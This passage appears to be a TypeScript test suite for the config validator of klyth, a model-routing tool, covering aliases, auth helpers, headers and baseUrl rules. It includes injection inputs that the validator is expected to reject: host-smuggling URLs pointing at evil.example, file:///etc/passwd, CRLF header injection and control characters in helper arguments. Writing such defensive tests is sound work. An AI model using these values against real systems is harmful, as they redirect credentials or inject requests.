// Config parsing, validation and resolution, and the advert and schema derived from a config.
import { expect, test } from 'claude-code/testing'

import { advert, agentSchema, modelNames, typeahead } from '../hooks/advert'
import { fingerprint, inputBudget, parseConfig } from '../hooks/config'
import { declaredAliases, explain, isKlythShaped, resolve } from '../hooks/names'
import type { Config } from '../hooks/config'
import { display } from '../hooks/load'
import { SCHEMAS } from '../hooks/schemas.gen'
import { trustPrompt } from '../hooks/trust'
import { EXAMPLE_CONFIG } from './fixtures/data.gen'
import { LOCAL_CONFIG, LOCAL_TRUSTED } from './world'

const MODEL = { contextWindow: 1_050_000, maxInputTokens: 922_000, maxOutputTokens: 128_000, maxTokensParam: 'max_completion_tokens' }
const HELPER = ['/usr/bin/security', 'find-generic-password', '-s', 'klyth', '-a', 'acme', '-w']
const OPENAI_HELPER = ['/usr/bin/security', 'find-generic-password', '-s', 'klyth', '-a', 'openai', '-w']
const base = (over: Record<string, unknown> = {}) => ({
  providers: {
    acme: { kind: 'openai', baseUrl: 'https://klyth.invalid/v1', auth: { command: HELPER }, models: { 'model-a': MODEL, 'model-b': MODEL } },
  },
  aliases: { fast: { target: 'acme/model-a', note: 'cheap explorer' }, strong: 'acme/model-b' },
  ...over,
})
const errorsOf = (v: unknown) => parseConfig(JSON.stringify(v)).errors
const withProvider = (p: Record<string, unknown>) => base({ providers: { acme: { ...base().providers.acme, ...p } } })
const withModel = (m: Record<string, unknown>) => withProvider({ models: { 'model-a': { ...MODEL, ...m }, 'model-b': MODEL } })
const config = () => parseConfig(JSON.stringify(base())).config as Config

test('example.klyth.json parses and validates clean: an https openai provider, its limits, effort levels up to high, and an alias', () => {
  const parsed = parseConfig(EXAMPLE_CONFIG)
  expect(parsed.errors).toEqual([])
  const openai = parsed.config?.providers['openai']
  expect(openai).toMatchObject({
    allowHttp: false,
    baseUrl: 'https://api.openai.com/v1',
    origin: 'https://api.openai.com',
    auth: { command: OPENAI_HELPER, ttlSeconds: 300 },
    authHeader: 'bearer',
    streamUsage: true,
  })
  expect(openai?.timeoutMs).toBeUndefined()
  const gpt = openai?.models['gpt-5']
  expect(gpt).toMatchObject({ contextWindow: 400_000, maxInputTokens: 272_000, maxOutputTokens: 128_000, maxTokensParam: 'max_completion_tokens' })
  expect(gpt?.effort).toEqual({ low: { reasoning_effort: 'low' }, medium: { reasoning_effort: 'medium' }, high: { reasoning_effort: 'high' } })
  expect(inputBudget(gpt!, 'openai')).toBe(272_000)
  expect(resolve(parsed.config as Config, 'gpt')).toMatchObject({ kind: 'remote', target: 'openai/gpt-5', label: 'gpt' })
})

test('an alias to an undeclared provider or model is rejected with its path', () => {
  expect(errorsOf(base({ aliases: { strong: 'acme9/model-b' } }))).toEqual(['aliases.strong → provider "acme9" is not declared (declared: acme)'])
  expect(errorsOf(base({ aliases: { strong: 'acme/gpt-6' } }))).toEqual([
    'aliases.strong → "gpt-6" is not declared under provider acme (declared: model-a, model-b)',
  ])
})

test('unknown keys are rejected by path, the agents map included, and version must be 1', () => {
  expect(errorsOf(base({ agents: { Explore: 'fast' } }))).toEqual(['$.agents: unknown key'])
  expect(errorsOf(withModel({ temprature: 1 }))).toEqual(['providers.acme.models.model-a.temprature: unknown key'])
  expect(errorsOf(base({ version: 2 }))).toEqual(['version: unsupported (klyth reads version 1)'])
  expect(errorsOf(base({ version: 1, $schema: 'https://example.invalid/s.json' }))).toEqual([])
})

const classifierOfConfig = (classifier: unknown, over: Record<string, unknown> = {}) => parseConfig(JSON.stringify(base({ classifier, ...over }))).config?.classifier

test('classifier opts in: absent leaves the config as it was, {} takes the defaults, and the keys set what they name', () => {
  expect(Object.keys(config())).toEqual(['providers', 'aliases', 'compaction'])
  expect(classifierOfConfig({})).toEqual({ model: 'same', context: 'fresh', tools: 'bounded', timeoutMs: 20_000, tokenMs: 20_000, maxPerTurn: 20 })
  expect(classifierOfConfig({ model: 'fast', timeoutMs: 30_000, tokenMs: 10_000, maxPerTurn: 5 })).toEqual({ model: 'fast', context: 'fresh', tools: 'bounded', timeoutMs: 30_000, tokenMs: 10_000, maxPerTurn: 5 })
  expect(classifierOfConfig({ tools: 'all' })?.tools).toBe('all')
  expect(classifierOfConfig({ model: 'acme/model-b' })?.model).toBe('acme/model-b')
  // The model is looked up among the aliases of the whole file, wherever the keys sit.
  expect(classifierOfConfig({ model: 'late' }, { aliases: { late: 'acme/model-a' } })?.model).toBe('late')
  expect(parseConfig(`{"classifier":{"model":"fast"},"aliases":{"fast":"acme/model-a"},"providers":${JSON.stringify(base().providers)}}`).errors).toEqual([])
})

test('classifier errors are reported by path with the rest of the file\'s, and any one leaves no config', () => {
  const classifierErrors = (classifier: unknown) => errorsOf(base({ classifier }))
  expect(classifierErrors('on')).toEqual(['classifier: must be an object'])
  expect(classifierErrors([])).toEqual(['classifier: must be an object'])
  expect(classifierErrors({ colour: 1 })).toEqual(['classifier.colour: unknown key'])
  expect(classifierErrors({ model: 'gpt' })).toEqual(['classifier.model: "gpt" is not an alias or provider/model of this file'])
  expect(classifierErrors({ model: 'acme/gpt-6' })).toEqual(['classifier.model: "acme/gpt-6" is not an alias or provider/model of this file'])
  expect(classifierErrors({ model: 'opus' })).toEqual(['classifier.model: a native model cannot classify a routed turn; use "same", an alias or provider/model'])
  expect(classifierErrors({ model: 'native/claude-haiku-4-5' })).toEqual(['classifier.model: a native model cannot classify a routed turn; use "same", an alias or provider/model'])
  expect(classifierErrors({ tools: 'every' })).toEqual(['classifier.tools: must be "bounded" or "all"'])
  expect(classifierErrors({ timeoutMs: 45_001 })).toEqual(['classifier.timeoutMs: must be a positive integer up to 45000'])
  expect(classifierErrors({ tokenMs: 0 })).toEqual(['classifier.tokenMs: must be a positive integer up to 45000'])
  expect(classifierErrors({ maxPerTurn: 201 })).toEqual(['classifier.maxPerTurn: must be a positive integer up to 200'])
  const both = parseConfig(JSON.stringify({ ...withModel({ contextWindow: 'big' }), classifier: 5 }))
  expect(both.config).toBeUndefined()
  expect(both.errors).toEqual(['providers.acme.models.model-a.contextWindow: must be a positive integer', 'classifier: must be an object'])
})

test('reserved body keys are rejected in provider, model and effort-level params', () => {
  expect(errorsOf(withProvider({ params: { n: 2, tool_choice: 'auto' } }))).toEqual([
    'providers.acme.params.n: reserved; klyth sets it',
    'providers.acme.params.tool_choice: reserved; klyth sets it',
  ])
  expect(errorsOf(withModel({ params: { functions: [], function_call: 'auto' } }))).toHaveLength(2)
  expect(errorsOf(withModel({ effort: { high: { stream: false } } }))).toEqual(['providers.acme.models.model-a.effort.high.stream: reserved; klyth sets it'])
})

test('auth-bearing header names, names that are not header tokens, and CR/LF values are rejected, case-insensitively', () => {
  for (const name of ['Authorization', 'Api-Key', 'X-Api-Key', 'Cookie', 'x-acme-api-key', 'X-Goog-Api-Key', 'Ocp-Apim-Subscription-Key', 'X-Key', 'X-Password', 'X-Credential']) {
    expect(errorsOf(withProvider({ headers: { [name]: 'v' } })), name).toEqual([`providers.acme.headers.${name}: auth-bearing headers are not allowed; the key comes from auth.command`])
  }
  for (const name of ['X Tag', 'x-tag:', 'x-tág']) expect(errorsOf(withProvider({ headers: { [name]: 'v' } })), name).toEqual([`providers.acme.headers.${name}: not a header name`])
  expect(errorsOf(withModel({ headers: { 'x-acme-tags': 'a\r\nInjected: 1' } }))).toEqual(['providers.acme.models.model-a.headers.x-acme-tags: must be printable ASCII text'])
  expect(errorsOf(withProvider({ headers: { 'x-acme-tags': 'klyth' } }))).toEqual([])
})

const HTTP_ONLY = 'providers.acme.baseUrl: must use https (plain http needs "allowHttp": true on the provider)'

test('baseUrl must be https with no credentials, query or fragment; http and localhost are rejected without allowHttp', () => {
  expect(errorsOf(withProvider({ baseUrl: 'https://user:pw@klyth.invalid/v1' }))).toEqual(['providers.acme.baseUrl: must not carry credentials'])
  expect(errorsOf(withProvider({ baseUrl: 'http://klyth.invalid/v1' }))).toEqual([HTTP_ONLY])
  expect(errorsOf(withProvider({ baseUrl: 'http://localhost:4000/v1' }))).toEqual([HTTP_ONLY])
  expect(errorsOf(withProvider({ baseUrl: 'http://klyth.invalid/v1', allowHttp: false }))).toEqual([HTTP_ONLY])
  expect(errorsOf(withProvider({ baseUrl: 'ftp://klyth.invalid/v1' }))).toEqual(['providers.acme.baseUrl: must use https'])
  for (const baseUrl of ['https://klyth.invalid/v1?team=a', 'https://klyth.invalid/v1#frag', 'https://klyth.invalid/v1?', 'https://klyth.invalid/v1#']) {
    expect(errorsOf(withProvider({ baseUrl })), baseUrl).toEqual(['providers.acme.baseUrl: must not carry a query or fragment'])
  }
})

test('allowHttp accepts a plain-http baseUrl for its own provider, with a port, and loosens nothing else', () => {
  const url = 'http://klyth.invalid:8080/v1'
  const parsed = parseConfig(JSON.stringify(withProvider({ baseUrl: url, allowHttp: true })))
  expect(parsed.errors).toEqual([])
  expect(parsed.config?.providers['acme']).toMatchObject({ allowHttp: true, baseUrl: url, origin: 'http://klyth.invalid:8080' })
  expect(config().providers['acme']?.allowHttp).toBe(false)
  const HOST = 'providers.acme.baseUrl: the host must be a DNS name (letters, digits and dashes, with no trailing dot)'
  const cases: [string, string][] = [
    ['http://user:pw@klyth.invalid/v1', 'providers.acme.baseUrl: must not carry credentials'],
    ['http://klyth.invalid/v1?team=a', 'providers.acme.baseUrl: must not carry a query or fragment'],
    ['http://localhost:4000/v1', HOST],
    ['http://klyth.invalid./v1', HOST],
    ['http://{klyth.invalid,evil.example}/v1', 'providers.acme.baseUrl: must not contain [, ], { or } (URL templates and IPv6 literals are not supported)'],
    ['http://klyth.invalid\\@evil.example/v1', 'providers.acme.baseUrl: must not contain a backslash or whitespace'],
    ['ftp://klyth.invalid/v1', 'providers.acme.baseUrl: must use https'],
    ['file:///etc/passwd', 'providers.acme.baseUrl: must use https'],
  ]
  for (const [baseUrl, error] of cases) expect(errorsOf(withProvider({ baseUrl, allowHttp: true })), baseUrl).toEqual([error])
  expect(errorsOf(withProvider({ baseUrl: 'https://klyth.invalid/v1', allowHttp: true }))).toEqual([])
  expect(errorsOf(withProvider({ allowHttp: 'yes' }))).toEqual(['providers.acme.allowHttp: must be true or false'])
})

test('a baseUrl with a backslash or whitespace is rejected, so no parser reads another host from it', () => {
  for (const baseUrl of ['https://llm.acme.example\\@evil.example/v1', 'https://llm.acme.example\\.evil.example/v1', ' https://klyth.invalid/v1', 'https://klyth.invalid/v1\t', 'https://klyth.in\nvalid/v1']) {
    expect(errorsOf(withProvider({ baseUrl })), JSON.stringify(baseUrl)).toEqual(['providers.acme.baseUrl: must not contain a backslash or whitespace'])
  }
})

test('a baseUrl holding a URL template or an IPv6 literal, or whose host is no plain DNS name, is rejected', () => {
  const GLOB = 'providers.acme.baseUrl: must not contain [, ], { or } (URL templates and IPv6 literals are not supported)'
  const HOST = 'providers.acme.baseUrl: the host must be a DNS name (letters, digits and dashes, with no trailing dot)'
  const cases: [string, string][] = [
    ['https://{llm.acme.example,evil.example}/v1', GLOB],
    ['https://llm.acme.example{,.evil.example}/v1', GLOB],
    ['https://llm.acme.example/v1/[1-2]', GLOB],
    ['https://[::1]/v1', GLOB],
    ['https://evil.example./v1', HOST],
    ['https://llm.acme.example./v1', HOST],
    ['https://localhost/v1', HOST],
    ['https://llm%7Bx.acme.cloud/v1', HOST],
    ['https://-llm.acme.example/v1', HOST],
  ]
  for (const [baseUrl, error] of cases) expect(errorsOf(withProvider({ baseUrl })), baseUrl).toEqual([error])
  for (const baseUrl of ['https://llm.acme.example/v1', 'https://LLM.ACME.example:8443/v1', 'https://10.0.0.7/v1', 'https://xn--bcher-kva.example/v1', 'https://bücher.example/v1']) {
    expect(errorsOf(withProvider({ baseUrl })), baseUrl).toEqual([])
  }
})

test('effort levels are checked by name and must be objects', () => {
  expect(errorsOf(withModel({ effort: { extreme: {} } }))).toEqual(['providers.acme.models.model-a.effort.extreme: unknown key'])
  expect(errorsOf(withModel({ effort: { high: 'high' } }))).toEqual(['providers.acme.models.model-a.effort.high: must be an object of params'])
})

test('maxTokensParam "none", a shadowed built-in alias and a models array are rejected', () => {
  expect(errorsOf(withModel({ maxTokensParam: 'none' }))).toEqual(['providers.acme.models.model-a.maxTokensParam: must be one of max_tokens, max_completion_tokens'])
  expect(errorsOf(base({ aliases: { opus: 'acme/model-b' } }))).toEqual(['aliases.opus: "opus" is a built-in model name'])
  expect(errorsOf(withProvider({ models: [{ id: 'model-a' }] }))).toContain('providers.acme.models: must be a map of model ids')
})

const LOGIN = 'klyth auth login api-key acme, which stores the key in the keychain and writes "auth": { "command": [...] }'
const OR_NONE = ', or set "auth": "none" for a server that checks no key'
const MUST_BE = 'providers.acme.auth: must be { "command": ["/absolute/helper", ...] } or "none"'
// The acme provider with its auth replaced: `undefined` leaves auth out.
const withAuth = (auth: unknown, extra: Record<string, unknown> = {}) => {
  const { auth: _, ...rest } = base().providers.acme
  return base({ providers: { acme: { ...rest, ...(auth === undefined ? {} : { auth }), ...extra } } })
}

test('apiKeyEnv is gone: it is refused with one line naming klyth auth login api-key, alone, with or without an auth beside it', () => {
  const MOVED = `providers.acme.apiKeyEnv: no longer read; keys come from a credential helper. Run ${LOGIN} in its place`
  expect(errorsOf(withAuth(undefined, { apiKeyEnv: 'ACME_KEY' }))).toEqual([MOVED])
  expect(errorsOf(withAuth({ command: HELPER }, { apiKeyEnv: 'ACME_KEY' }))).toEqual([MOVED])
  expect(errorsOf(withAuth(undefined))).toEqual([`providers.acme.auth: missing; run ${LOGIN}${OR_NONE}`])
})

test('auth is a credential helper: an absolute argv with no control characters, an optional ttl, and no env source', () => {
  const parsed = (auth: unknown) => parseConfig(JSON.stringify(withAuth(auth))).config?.providers['acme']?.auth
  expect(parsed({ command: HELPER })).toEqual({ command: HELPER, ttlSeconds: 300 })
  expect(parsed({ command: ['/opt/homebrew/bin/jq', '-er', '.acme.key', '/home/u/.local/share/opencode/auth.json'], ttlSeconds: 60 })).toEqual({
    command: ['/opt/homebrew/bin/jq', '-er', '.acme.key', '/home/u/.local/share/opencode/auth.json'],
    ttlSeconds: 60,
  })
  const cases: [unknown, string[]][] = [
    [{ env: 'ACME_KEY' }, [`providers.acme.auth.env: not supported; keys come from "command" (run ${LOGIN})`, 'providers.acme.auth.command: must be a non-empty list of strings']],
    ['/usr/bin/security', [MUST_BE]],
    ['None', [MUST_BE]],
    [false, [MUST_BE]],
    [{ none: true }, ['providers.acme.auth.none: unknown key', 'providers.acme.auth.command: must be a non-empty list of strings']],
    [{ command: [] }, ['providers.acme.auth.command: must be a non-empty list of strings']],
    [{ command: '/usr/bin/security -w' }, ['providers.acme.auth.command: must be a non-empty list of strings']],
    [{ command: ['/usr/bin/security', 7] }, ['providers.acme.auth.command: must be a non-empty list of strings']],
    [{ command: ['security', '-w'] }, ['providers.acme.auth.command: the first entry must be an absolute path (no shell expands ~ or searches PATH)']],
    [{ command: ['~/bin/key'] }, ['providers.acme.auth.command: the first entry must be an absolute path (no shell expands ~ or searches PATH)']],
    [{ command: ['/usr/bin/security', '-s', 'klyth\r\nAllow'] }, ['providers.acme.auth.command: must not contain control characters']],
    [{ command: HELPER, ttlSeconds: 0 }, ['providers.acme.auth.ttlSeconds: must be a positive integer']],
    [{ command: HELPER, ttlSeconds: '300' }, ['providers.acme.auth.ttlSeconds: must be a positive integer']],
    [{ command: HELPER, shell: true }, ['providers.acme.auth.shell: unknown key']],
  ]
  for (const [auth, errors] of cases) expect(errorsOf(withAuth(auth)), JSON.stringify(auth)).toEqual(errors)
})

test('auth "none" declares a server that checks no key; the string is exact, a retired apiKeyEnv is still refused, and bedrock always needs a key', () => {
  const parsed = (auth: unknown, kind = 'openai') => parseConfig(JSON.stringify(ofKind(kind, { auth }))).config?.providers['acme']?.auth
  expect(parsed('none')).toBe('none')
  expect(parsed('none', 'anthropic')).toBe('none')
  expect(errorsOf(ofKind('openai', { auth: 'none' }))).toEqual([])
  expect(errorsOf(ofKind('anthropic', { auth: 'none' }))).toEqual([])
  expect(errorsOf(ofKind('bedrock', { auth: 'none' }))).toEqual(['providers.acme.auth: "none" is not allowed on a bedrock provider; Bedrock needs a key'])
  expect(errorsOf(ofKind('bedrock', { auth: { command: HELPER } }))).toEqual([])
  for (const word of ['None', 'NONE', ' none', 'no', '']) expect(errorsOf(ofKind('openai', { auth: word })), word).toEqual([MUST_BE])
  expect(errorsOf(withAuth('none', { apiKeyEnv: 'ACME_KEY' }))).toEqual([expect.stringContaining('providers.acme.apiKeyEnv: no longer read')])
})

// A provider of `kind` with one model, both extended by `p` and `m`.
const ofKind = (kind: string, p: Record<string, unknown> = {}, m: Record<string, unknown> = {}) =>
  base({ providers: { acme: { kind, baseUrl: 'https://klyth.invalid', auth: { command: HELPER }, ...p, models: { 'model-a': { contextWindow: 200_000, maxOutputTokens: 64_000, ...m }, 'model-b': { contextWindow: 200_000, maxOutputTokens: 8000 } } } } })

test('the kind is openai, openai-responses, anthropic or bedrock, and each takes its own provider and model keys', () => {
  expect(errorsOf(ofKind('gemini'))).toEqual(['providers.acme.kind: must be "openai", "openai-responses", "anthropic" or "bedrock"'])
  expect(errorsOf(ofKind('anthropic', { authHeader: 'bearer' }, { parallelToolCalls: false }))).toEqual([])
  expect(errorsOf(ofKind('anthropic', { streamUsage: false }, { systemRole: 'developer', maxTokensParam: 'max_tokens' }))).toEqual([
    'providers.acme.streamUsage: unknown key',
    'providers.acme.models.model-a.systemRole: unknown key',
    'providers.acme.models.model-a.maxTokensParam: unknown key',
  ])
  expect(errorsOf(ofKind('bedrock', { authHeader: 'bearer' }, { parallelToolCalls: false }))).toEqual([
    'providers.acme.authHeader: unknown key',
    'providers.acme.models.model-a.parallelToolCalls: unknown key',
  ])
  expect(errorsOf(ofKind('openai', { authHeader: 'x-api-key' }))).toEqual(['providers.acme.authHeader: unknown key'])
  expect(errorsOf(ofKind('openai-responses', {}, { parallelToolCalls: false, maxTokensParam: 'max_output_tokens' }))).toEqual([])
  expect(errorsOf(ofKind('openai-responses', { streamUsage: false, authHeader: 'bearer' }, { systemRole: 'developer' }))).toEqual([
    'providers.acme.streamUsage: unknown key',
    'providers.acme.authHeader: unknown key',
    'providers.acme.models.model-a.systemRole: unknown key',
  ])
  expect(errorsOf(ofKind('anthropic', { authHeader: 'basic' }))).toEqual(['providers.acme.authHeader: must be "bearer" or "x-api-key"'])
  const header = (c: unknown) => parseConfig(JSON.stringify(c)).config?.providers['acme']?.authHeader
  expect([header(ofKind('anthropic')), header(ofKind('anthropic', { authHeader: 'bearer' })), header(ofKind('openai')), header(ofKind('bedrock'))]).toEqual(['x-api-key', 'bearer', 'bearer', 'bearer'])
})

test('maxTokensParam names the key its kind sends: max_tokens or max_completion_tokens on openai, max_output_tokens on openai-responses', () => {
  const param = (kind: string, value: string) => errorsOf(ofKind(kind, {}, { maxTokensParam: value }))
  expect([param('openai', 'max_tokens'), param('openai', 'max_completion_tokens'), param('openai-responses', 'max_output_tokens')]).toEqual([[], [], []])
  expect(param('openai', 'max_output_tokens')).toEqual(['providers.acme.models.model-a.maxTokensParam: must be one of max_tokens, max_completion_tokens'])
  expect(param('openai-responses', 'max_tokens')).toEqual(['providers.acme.models.model-a.maxTokensParam: must be one of max_output_tokens'])
  expect(param('openai-responses', 'max_completion_tokens')).toHaveLength(1)
})

test("each kind refuses the body keys its requests set, in provider, model and effort-level params, and only those", () => {
  const reserved = (kind: string, key: string) => errorsOf(ofKind(kind, { params: { [key]: 1 } }, { effort: { high: { [key]: 1 } } }))
  for (const key of ['model', 'messages', 'system', 'tools', 'tool_choice', 'stream', 'max_tokens']) {
    expect(reserved('anthropic', key), key).toEqual([`providers.acme.models.model-a.effort.high.${key}: reserved; klyth sets it`, `providers.acme.params.${key}: reserved; klyth sets it`])
  }
  for (const key of ['messages', 'system', 'toolConfig']) {
    expect(reserved('bedrock', key), key).toEqual([`providers.acme.models.model-a.effort.high.${key}: reserved; klyth sets it`, `providers.acme.params.${key}: reserved; klyth sets it`])
  }
  for (const key of ['model', 'input', 'instructions', 'tools', 'tool_choice', 'stream', 'store', 'previous_response_id', 'conversation']) {
    expect(reserved('openai-responses', key), key).toEqual([`providers.acme.models.model-a.effort.high.${key}: reserved; klyth sets it`, `providers.acme.params.${key}: reserved; klyth sets it`])
  }
  for (const [kind, key] of [['openai', 'max_tokens'], ['openai', 'system'], ['bedrock', 'inferenceConfig'], ['bedrock', 'additionalModelRequestFields'], ['openai', 'thinking'], ['anthropic', 'n'], ['openai-responses', 'messages'], ['openai-responses', 'max_output_tokens'], ['openai-responses', 'reasoning']]) {
    expect(reserved(kind as string, key as string), `${kind} ${key}`).toEqual([])
  }
})

test('Claude thinking and effort params pass on the anthropic and bedrock kinds, in provider, model and effort-level params', () => {
  const thinking = { type: 'adaptive' }
  const level = (effort: string) => ({ thinking, output_config: { effort } })
  expect(errorsOf(ofKind('anthropic', { params: { thinking: { type: 'enabled', budget_tokens: 2048 } } }, { params: { thinking }, effort: { low: level('low'), max: level('max') } }))).toEqual([])
  const fields = (effort: string) => ({ additionalModelRequestFields: level(effort) })
  expect(errorsOf(ofKind('bedrock', { params: { additionalModelRequestFields: { thinking } } }, { params: fields('high'), effort: { low: fields('low'), xhigh: fields('xhigh') } }))).toEqual([])
  expect(errorsOf(ofKind('openai', { params: { thinking } }, { effort: { high: { thinking } } }))).toEqual([])
  const sonnet = parseConfig(JSON.stringify(ofKind('bedrock', {}, { effort: { high: fields('high') } }))).config?.providers['acme']?.models['model-a']
  expect(sonnet?.effort?.high).toEqual(fields('high'))
})

test('cache is "5m" or "1h" on the anthropic and bedrock kinds, absent is off, and the openai kinds take none', () => {
  const cache = (kind: string, value: unknown) => parseConfig(JSON.stringify(ofKind(kind, {}, { cache: value })))
  for (const kind of ['anthropic', 'bedrock']) {
    expect(cache(kind, '5m').config?.providers['acme']?.models['model-a']?.cache).toBe('5m')
    expect(cache(kind, '1h').config?.providers['acme']?.models['model-a']?.cache).toBe('1h')
    expect(cache(kind, '30m').errors).toEqual(['providers.acme.models.model-a.cache: must be "5m" or "1h"'])
    expect(cache(kind, true).errors).toEqual(['providers.acme.models.model-a.cache: must be "5m" or "1h"'])
    expect(parseConfig(JSON.stringify(ofKind(kind))).config?.providers['acme']?.models['model-a']?.cache).toBeUndefined()
  }
  expect(cache('openai', '5m').errors).toEqual(['providers.acme.models.model-a.cache: not supported on the openai kind (it caches on its own)'])
  expect(cache('openai-responses', '5m').errors).toEqual(['providers.acme.models.model-a.cache: not supported on the openai-responses kind (it caches on its own)'])
})

test('an openai-responses provider takes reasoning params and effort levels, and an alias resolves to it', () => {
  const m = { params: { reasoning: { summary: 'auto' } }, effort: { low: { reasoning: { effort: 'low' } }, high: { reasoning: { effort: 'high' } } } }
  const c = parseConfig(JSON.stringify({ ...ofKind('openai-responses', {}, m), aliases: { sol: 'acme/model-a' } }))
  expect(c.errors).toEqual([])
  const target = resolve(c.config as Config, 'sol') as Extract<ReturnType<typeof resolve>, { kind: 'remote' }>
  expect(target.provider).toMatchObject({ kind: 'openai-responses', authHeader: 'bearer', streamUsage: true })
  expect(target.model).toMatchObject({ params: m.params, effort: m.effort })
})

// The base config with one alias to acme/model-a of `kind`, extended by `a`.
const aliased = (a: Record<string, unknown>, kind = 'anthropic') => ({ ...ofKind(kind), aliases: { deep: { target: 'acme/model-a', ...a } } })

test('an alias takes a model\'s request keys, checked as a model\'s are against the kind of the provider it targets', () => {
  const thinking = { type: 'adaptive' }
  expect(errorsOf(aliased({ params: { thinking, top_k: 5 }, effort: { low: { output_config: { effort: 'low' } } }, cache: '1h', headers: { 'x-tag': 'deep' } }))).toEqual([])
  expect(errorsOf(aliased({ params: { thinking }, cache: '5m' }, 'bedrock'))).toEqual([])
  // The same reserved-key, effort-map, cache and header rules, reported at the alias's path.
  expect(errorsOf(aliased({ params: { model: 'x' }, effort: { high: { max_tokens: 1 }, huge: {} }, cache: '2h', headers: { authorization: 'x' } }))).toEqual([
    'aliases.deep.effort.huge: unknown key',
    'aliases.deep.effort.high.max_tokens: reserved; klyth sets it',
    'aliases.deep.params.model: reserved; klyth sets it',
    'aliases.deep.cache: must be "5m" or "1h" (null turns the model\'s cache off)',
    'aliases.deep.headers.authorization: auth-bearing headers are not allowed; the key comes from auth.command',
  ])
  expect(errorsOf(aliased({ params: 'x', effort: [] }))).toEqual(['aliases.deep.effort: must be an object', 'aliases.deep.params: must be an object'])
  expect(errorsOf(aliased({ cache: '5m' }, 'openai'))).toEqual(['aliases.deep.cache: not supported on the openai kind (it caches on its own)'])
  expect(errorsOf(aliased({ params: { stream: false } }, 'openai'))).toEqual(['aliases.deep.params.stream: reserved; klyth sets it'])
  expect(errorsOf(aliased({ params: { stream: false } }, 'bedrock'))).toEqual([])
  expect(errorsOf(aliased({ params: { messages: [] } }, 'bedrock'))).toEqual(['aliases.deep.params.messages: reserved; klyth sets it'])
  expect(errorsOf(aliased({ colour: 'red' }))).toEqual(['aliases.deep.colour: unknown key'])
  // A native target has no request to shape, and an undeclared one is reported once.
  expect(errorsOf(base({ aliases: { quick: { target: 'native/claude-haiku-4-5', cache: '5m' } } }))).toEqual(['aliases.quick: params, effort, cache, headers need a provider/model target, not a native one'])
  expect(errorsOf(base({ aliases: { quick: { target: 'acme9/x', cache: '5m' } } }))).toEqual(['aliases.quick → provider "acme9" is not declared (declared: acme)'])
})

test("an alias's cache: null turns off the cache its model sets; an alias with no cache key keeps it, and a model's null is refused", () => {
  const c = parseConfig(JSON.stringify({ ...ofKind('anthropic', {}, { cache: '1h' }), aliases: { off: { target: 'acme/model-a', cache: null }, same: { target: 'acme/model-a', params: { top_k: 1 } }, short: { target: 'acme/model-a', cache: '5m' } } })).config as Config
  const cache = (name: string) => (resolve(c, name) as Extract<ReturnType<typeof resolve>, { kind: 'remote' }>).model.cache
  expect([cache('acme/model-a'), cache('off'), cache('same'), cache('short')]).toEqual(['1h', undefined, '1h', '5m'])
  expect(errorsOf(ofKind('anthropic', {}, { cache: null }))).toEqual(['providers.acme.models.model-a.cache: must be "5m" or "1h"'])
  expect(errorsOf(aliased({ cache: null }, 'openai'))).toEqual(['aliases.deep.cache: not supported on the openai kind (it caches on its own)'])
})

test('a thinking budget must be below maxOutputTokens wherever it is set: a model, an effort level, the provider, an alias, or Bedrock\'s additional fields', () => {
  const thinking = (budget_tokens: number) => ({ thinking: { type: 'enabled', budget_tokens } })
  // model-a allows 64000 output tokens, model-b 8000.
  expect(errorsOf(ofKind('anthropic', {}, { params: thinking(63_999) }))).toEqual([])
  expect(errorsOf(ofKind('anthropic', {}, { params: thinking(64_000) }))).toEqual(['providers.acme.models.model-a.params.thinking.budget_tokens: 64000 must be below maxOutputTokens (64000)'])
  expect(errorsOf(ofKind('anthropic', {}, { effort: { high: thinking(70_000) } }))).toEqual(['providers.acme.models.model-a.effort.high.thinking.budget_tokens: 70000 must be below maxOutputTokens (64000)'])
  expect(errorsOf(ofKind('bedrock', {}, { params: { additionalModelRequestFields: thinking(100_000) } }))).toEqual([
    'providers.acme.models.model-a.params.thinking.budget_tokens: 100000 must be below maxOutputTokens (64000)',
  ])
  // The provider's params reach every model, so the smallest limit counts.
  expect(errorsOf(ofKind('anthropic', { params: thinking(10_000) }))).toEqual(['providers.acme.params.thinking.budget_tokens: 10000 must be below maxOutputTokens (8000)'])
  expect(errorsOf({ ...ofKind('anthropic'), aliases: { deep: { target: 'acme/model-b', params: thinking(9000) } } })).toEqual(['aliases.deep.params.thinking.budget_tokens: 9000 must be below maxOutputTokens (8000)'])
  expect(errorsOf({ ...ofKind('anthropic'), aliases: { deep: { target: 'acme/model-a', params: thinking(9000) } } })).toEqual([])
  expect(errorsOf(ofKind('anthropic', {}, { params: { thinking: { type: 'adaptive' } } }))).toEqual([])
})

test('a name resolves to the model as its alias requests it: the alias\'s params, headers, effort map and cache over the model\'s; the model itself is unchanged', () => {
  const c = parseConfig(JSON.stringify({
    ...ofKind('anthropic', {}, { params: { top_k: 1 }, headers: { 'x-a': '1', 'x-b': '1' }, effort: { low: { top_p: 0.1 } }, cache: '5m' }),
    aliases: {
      fast: { target: 'acme/model-a', params: { top_k: 2 }, headers: { 'x-b': '2' }, effort: { high: { top_p: 0.9 } } },
      deep: { target: 'acme/model-a', cache: '1h' },
      plain: 'acme/model-a',
    },
  })).config as Config
  const model = (name: string) => (resolve(c, name) as Extract<ReturnType<typeof resolve>, { kind: 'remote' }>).model
  expect(model('acme/model-a')).toMatchObject({ params: { top_k: 1 }, headers: { 'x-a': '1', 'x-b': '1' }, effort: { low: { top_p: 0.1 } }, cache: '5m' })
  expect(model('acme/model-a').overrides).toBeUndefined()
  expect(model('fast')).toMatchObject({ params: { top_k: 1 }, overrides: { top_k: 2 }, headers: { 'x-a': '1', 'x-b': '2' }, effort: { high: { top_p: 0.9 } }, cache: '5m' })
  expect(model('fast').effort?.low).toBeUndefined()
  expect(model('deep')).toMatchObject({ effort: { low: { top_p: 0.1 } }, cache: '1h' })
  expect(model('plain')).toMatchObject({ params: { top_k: 1 }, headers: { 'x-a': '1', 'x-b': '1' }, effort: { low: { top_p: 0.1 } }, cache: '5m' })
  expect(resolve(c, 'fast')).toMatchObject({ label: 'fast', target: 'acme/model-a' })
})

test('timeoutMs is a positive integer of at most 2^31 - 1 ms, the longest timer there is (a longer one fires at once)', () => {
  const MAX = 'providers.acme.timeoutMs: must be a positive integer of at most 2147483647'
  for (const timeoutMs of [0, -1, 1.5, '30', 2 ** 31, 2 ** 40]) expect(errorsOf(withProvider({ timeoutMs })), String(timeoutMs)).toEqual([MAX])
  for (const timeoutMs of [1, 1_800_000, 2 ** 31 - 1]) expect(errorsOf(withProvider({ timeoutMs })), String(timeoutMs)).toEqual([])
